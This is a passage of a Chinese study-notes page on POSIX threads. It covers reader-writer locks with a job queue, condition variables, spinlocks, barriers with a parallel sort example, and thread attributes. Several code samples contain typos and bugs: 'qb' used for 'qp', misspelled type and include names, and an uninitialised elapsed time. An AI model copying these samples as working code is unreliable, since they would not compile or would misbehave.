class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job</span> *<span class="hljs-title">j_next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job</span> *<span class="hljs-title">j_prev</span>;</span><br>    <span class="hljs-type">pthread_t</span> j_id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job</span> *<span class="hljs-title">q_head</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job</span> *<span class="hljs-title">q_tail</span>;</span><br>    <span class="hljs-type">pthread_rwlock_t</span> q_lock;<br>&#125;;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">queue_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> <span class="hljs-built_in">queue</span> *qp)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br><br>    qp-&gt;q_head = <span class="hljs-literal">NULL</span>;<br>    qp-&gt;q_tail = <span class="hljs-literal">NULL</span>;<br>    err = pthread_rwlock_init(&amp;qb-&gt;q_lock,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(err);<br>    <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">job_insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> <span class="hljs-built_in">queue</span> *qp, <span class="hljs-keyword">struct</span> job *jp)</span> <span class="hljs-comment">//队头插入</span><br>&#123;<br>    pthread_rwlock_wrlock(&amp;qb-&gt;q_lock); <span class="hljs-comment">//写锁</span><br>    jp-&gt;j_next = qp-&gt;q_head;<br>    jp-&gt;j_prev = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (qb-&gt;q_head != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//空队列</span><br>        qb-&gt;q_head-&gt;j_prev = jp;<br>    <span class="hljs-keyword">else</span><br>        qb-&gt;q_tail = jp;<br>    qb-&gt;q_head = jp;<br>    pthread_rwlock_unlock(&amp;qb-&gt;q_lock);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">job_append</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> <span class="hljs-built_in">queue</span> *qp, <span class="hljs-keyword">struct</span> job *jp)</span> <span class="hljs-comment">//队尾插入</span><br>&#123;<br>    pthread_rwlock_wrlock(&amp;qb-&gt;q_lock);<br>    jp-&gt;j_next = <span class="hljs-literal">NULL</span>;<br>    jp-&gt;j_prev = qp-&gt;q_tail;<br>    <span class="hljs-keyword">if</span> (qp-&gt;q_tail != <span class="hljs-literal">NULL</span>)<br>        qp-&gt;q_tail-&gt;j_next = jp;<br>    <span class="hljs-keyword">else</span><br>        qp-&gt;q_head = jp;<br>    qp-&gt;q_tail = jp;<br>    pthread_rwlock_unlock(&amp;qb-&gt;q_lock);<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">job_remove</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> <span class="hljs-built_in">queue</span> *qp,<span class="hljs-keyword">struct</span> job *jp)</span><br>&#123;<br>    pthread_rwlock_wrlock(&amp;qb-&gt;q_lock);<br>    <span class="hljs-keyword">if</span> (jp == qb-&gt;q_head)&#123;<br>        qp-&gt;q_head = jp-&gt;j_next;<br>        <span class="hljs-keyword">if</span>(qp-&gt;q_tail == jp)<br>            qp-&gt;q_tail = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">else</span><br>            jp-&gt;j_next-&gt;j_prev = jp-&gt;j_prev;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jp == qb-&gt;q_tail)&#123;<br>        qp-&gt;q_tail = jp-&gt;j_prev;<br>        jp-&gt;j_prev-&gt;j_next = jp-&gt;j_next;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        jp-&gt;j_prev-&gt;j_next = jp-&gt;j_next;<br>        jp-&gt;j_next-&gt;j_prev = jp-&gt;j_prev;<br>    &#125;<br>    pthread_rwlock_unlock(&amp;qb-&gt;q_lock);<br>&#125;<br><br><span class="hljs-keyword">struct</span> job *<br><span class="hljs-title function_">job_find</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> <span class="hljs-built_in">queue</span> *qp, <span class="hljs-type">pthread_t</span> id)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job</span> *<span class="hljs-title">jp</span>;</span><br>    <span class="hljs-keyword">if</span> (pthread_rwlock_rdlock(&amp;qp-&gt;q_lock) != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">for</span> (jp = qp-&gt;q_head; jp != <span class="hljs-literal">NULL</span>; jp = jp-&gt;j_next)<br>        <span class="hljs-keyword">if</span> (pthread_equal(jp-&gt;j_id, id))<br>            <span class="hljs-keyword">break</span>;<br>    pthread_rwlock_unlock(&amp;qp-&gt;q_lock);<br>    <span class="hljs-keyword">return</span>(jp);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="指定时间阻塞锁定读写器"><a href="#指定时间阻塞锁定读写器" class="headerlink" title="指定时间阻塞锁定读写器"></a>指定时间阻塞锁定读写器</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_timedrdlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *<span class="hljs-keyword">restrict</span> rwlock, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *<span class="hljs-keyword">restrict</span> tsptr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_rwlock_timedwrlock</span><span class="hljs-params">(<span class="hljs-type">pthread_rwlock_t</span> *<span class="hljs-keyword">restrict</span> rwlock, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *<span class="hljs-keyword">restrict</span> tsptr)</span>;<br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><h2 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h2><p>利用状态加锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_init</span><span class="hljs-params">(<span class="hljs-type">pthread_cont_t</span> *<span class="hljs-keyword">restrict</span> cond, <span class="hljs-type">const</span> <span class="hljs-type">pthread_condattr_t</span> *<span class="hljs-keyword">restrict</span> attr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_cond_t</span> *cond)</span>;<br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><p>状态等待</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_wait</span><span class="hljs-params">(<span class="hljs-type">pthread_cond_t</span> *<span class="hljs-keyword">restrict</span> cond, <span class="hljs-type">pthread_mutex_t</span> *<span class="hljs-keyword">restrict</span> mutex)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_timedwait</span><span class="hljs-params">(<span class="hljs-type">pthread_cond_t</span> *restricct cond, <span class="hljs-type">pthread_mutex_t</span> *<span class="hljs-keyword">restrict</span> mutex,<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> timespec *<span class="hljs-keyword">restrict</span> tsptr)</span>;<br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><p>获取超时的绝对时间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">maketimeout</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timespec *tsp, <span class="hljs-type">long</span> minutes)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">now</span>;</span><br>    gettimeofday(&amp;now, <span class="hljs-literal">NULL</span>);<br>    tsp-&gt;tv_sec = now.tv_sec;<br>    tsp-&gt;tv_nsec = now.tv_usec * <span class="hljs-number">1000</span>;<br>    tsp-&gt;tv_sec += minutes * <span class="hljs-number">60</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>唤醒线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_signal</span><span class="hljs-params">(<span class="hljs-type">pthread_cond_t</span> *cond)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cond_broadcast</span><span class="hljs-params">(<span class="hljs-type">pthread_cont_t</span> *cond)</span>;<br>Both <span class="hljs-keyword">return</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_spin_init</span><span class="hljs-params">(<span class="hljs-type">pthread_spinlock_t</span> *lock, <span class="hljs-type">int</span> pshared)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_spin_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_spinlock_t</span> *lock)</span>;<br>Both <span class="hljs-keyword">return</span>:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#inlucde <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_spin_lock</span><span class="hljs-params">(<span class="hljs-type">pthread_spinlock_t</span> *lock)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_spin_trylock</span><span class="hljs-params">(<span class="hljs-type">pthread_spinlock_t</span> *lock)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_spin_unlock</span><span class="hljs-params">(<span class="hljs-type">pthread_spinlock_t</span> *lock)</span>;<br>All <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><h2 id="屏障"><a href="#屏障" class="headerlink" title="屏障"></a>屏障</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrier_init</span><span class="hljs-params">(<span class="hljs-type">pthread_barrier_t</span> *<span class="hljs-keyword">restrict</span> barrier, <span class="hljs-type">const</span> <span class="hljs-type">pthread_barrierattr_t</span> *<span class="hljs-keyword">restrict</span> attr,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrier_destory</span><span class="hljs-params">(<span class="hljs-type">pthread_barrier_t</span> *barrier)</span>;<br>Both <span class="hljs-keyword">return</span>: <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><p>等待其他线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_barrier_wait</span><span class="hljs-params">(<span class="hljs-type">pthread_barrier_t</span> *barrier)</span>;<br>Returns:<span class="hljs-number">0</span> or PTHREAD_BARRIER_SERIAL_THREAD <span class="hljs-keyword">if</span> OK, error number on failure<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;limits.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NTHR 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUMNUM 8000000L</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TNUM (NUMNUM/NTHR) <span class="hljs-comment">//一百万</span></span><br><br><br><span class="hljs-type">long</span> nums[NUMNUM];<br><span class="hljs-type">long</span> snums[NUMNUM];<br><br><span class="hljs-type">pthread_barrier_t</span> b; <span class="hljs-comment">//屏障变量</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SOLARIS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> heapsort qsort</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">heapsort</span><span class="hljs-params">(<span class="hljs-type">void</span> *, <span class="hljs-type">size_t</span>, <span class="hljs-type">size_t</span>,</span><br><span class="hljs-params">                    <span class="hljs-type">int</span> (*)(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *))</span>; <span class="hljs-comment">//堆排序</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">complong</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *arg1, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *arg2)</span> <span class="hljs-comment">//比较</span><br>&#123;<br>    <span class="hljs-type">long</span> l1 = *(<span class="hljs-type">long</span> *)arg1;<br>    <span class="hljs-type">long</span> l2 = *(<span class="hljs-type">long</span> *)arg2;<br>    <span class="hljs-keyword">if</span> (l1 == l2)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (l1 &lt; l2)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span>    <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">void</span> *<br><span class="hljs-title function_">thr_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">long</span> idx = (<span class="hljs-type">long</span>)arg;<br>    heapsort(&amp;nums[idx], TNUM, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), complong); <span class="hljs-comment">//堆排序一百万个数据</span><br>    pthread_barrier_wait(&amp;b);<br>    <span class="hljs-keyword">return</span>((<span class="hljs-type">void</span> *)<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> idx[NTHR];<br>    <span class="hljs-type">long</span> i, minidx, sidx, num;<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NTHR; i++)<br>        idx[i] = i *TNUM; <span class="hljs-comment">//八百万数据</span><br>    <span class="hljs-keyword">for</span> (sidx = <span class="hljs-number">0</span>; sidx &lt; NUMNUM; sidx++)&#123; <span class="hljs-comment">//每次比较八个百万数组中的值，获得最小值放到snums数组中</span><br>        num = LONG_MAX; <span class="hljs-comment">//最大值</span><br>        <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NTHR; i++)&#123;<br>            <span class="hljs-keyword">if</span> ((idx[i] &lt; (i+<span class="hljs-number">1</span>)*TNUM) &amp;&amp; (nums[idx[i]] &lt; num))&#123;<br>                num = nums[idx[i]];<br>                minidx = i;<br>            &#125;<br>        &#125;<br>        snums[sidx] = nums[idx[minidx]];<br>        idx[minidx]++;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> i;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">start</span>, <span class="hljs-title">end</span>;</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> startusec, endusec;<br>    <span class="hljs-type">double</span> elapsed;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-type">pthread_t</span> tid;<br><br>    srandom(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NUMNUM; i++)<br>        nums[i] = random(); <span class="hljs-comment">//生成八百万个随机的数据</span><br><br>    gettimeofday(&amp;start, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">//获取时间</span><br>    pthread_barrier_init(&amp;b, <span class="hljs-literal">NULL</span>, NTHR+<span class="hljs-number">1</span>); <span class="hljs-comment">//初始化屏障锁</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NTHR; i++)&#123;<br>        err = pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thr_fn, (<span class="hljs-type">void</span> *)(i * TNUM)); <span class="hljs-comment">//启动八个线程进行堆排序</span><br>        <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;can&#x27;t create thread&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>    &#125;<br>    pthread_barrier_wait(&amp;b); <span class="hljs-comment">//八个线程都准备就绪</span><br>    merge(); <span class="hljs-comment">//合并八个线程的数据</span><br>    gettimeofday(&amp;end,<span class="hljs-literal">NULL</span>);<br>    startusec = start.tv_sec * <span class="hljs-number">1000000</span> + start.tv_usec;<br>    endusec = end.tv_sec * <span class="hljs-number">1000000</span> + end.tv_usec;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sort took %.4f seconds \n&quot;</span>,elapsed);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NUMNUM; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld\n&quot;</span>,snums[i]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h1><h2 id="线程属性"><a href="#线程属性" class="headerlink" title="线程属性"></a>线程属性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_init</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *attr)</span>;<span class="hljs-comment">//用于初始化pathread_attr_t结构体，并使得属性都为默认值</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_destroy</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *attr)</span>;<span class="hljs-comment">//销毁属性结构体</span><br><span class="hljs-comment">//Both return:0 if OK, error number on failure</span><br></code></pre></td></tr></table></figure><h2 id="获取线程的分离状态"><a href="#获取线程的分离状态" class="headerlink" title="获取线程的分离状态"></a>获取线程的分离状态</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_getdetachstate</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *<span class="hljs-keyword">restrict</span> attr, <span class="hljs-type">int</span> *detachstate)</span>;<span class="hljs-comment">//获取detachstate属性，属性值为PTHREAD_CREATE_DETACHED或PTHREAD_CREATE_JOINABLE</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_setdetachstate</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *attr, <span class="hljs-type">int</span> detachstate)</span>;<br><span class="hljs-comment">//Both return:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">makethread</span><span class="hljs-params">(<span class="hljs-type">void</span> *(*fn)(<span class="hljs-type">void</span> *), <span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> err;<br>    <span class="hljs-type">pthread_t</span>  tid;<br>    <span class="hljs-type">pthread_attr_t</span> attr;<br><br>    err = pthread_attr_init(&amp;attr);<br>    <span class="hljs-keyword">if</span> (err != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>(err);<br>    err = pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_DETACHED);<br>    <span class="hljs-keyword">if</span> (err == <span class="hljs-number">0</span>)<br>        err = pthread_create(&amp;tid, &amp;attr, fn, arg);<br>    pthread_attr_destroy(&amp;attr);<br>    <span class="hljs-keyword">return</span>(err);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="线程堆栈属性"><a href="#线程堆栈属性" class="headerlink" title="线程堆栈属性"></a>线程堆栈属性</h2><p>设置线程的堆栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_getstack</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *<span class="hljs-keyword">restrict</span> attr,</span><br><span class="hljs-params">                         <span class="hljs-type">void</span> **<span class="hljs-keyword">restrict</span> stackaddr,</span><br><span class="hljs-params">                         <span class="hljs-type">size_t</span> *<span class="hljs-keyword">restrict</span> stacksize)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_setstack</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span> *attr,</span><br><span class="hljs-params">                         <span class="hljs-type">void</span> *stackaddr,</span><br><span class="hljs-params">                         <span class="hljs-type">size_t</span> stacksize)</span>;<br><span class="hljs-comment">//Both return:0 if OK,error number on failure</span><br></code></pre></td></tr></table></figure><p>获取与设置堆栈大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_getstacksize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">pthread_attr_t</span> *<span class="hljs-keyword">restrict</span> attr,<span class="hljs-type">size_t</span> *<span class="hljs-keyword">restrict</span> stacksize)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_attr_setstacksize</span><span class="hljs-params">(<span class="hljs-type">pthread_attr_t</span>, <span class="hljs-type">size_t</span> stacksize)</span>;<br><span class="hljs-comment">//Both return:0 if OK,error number on 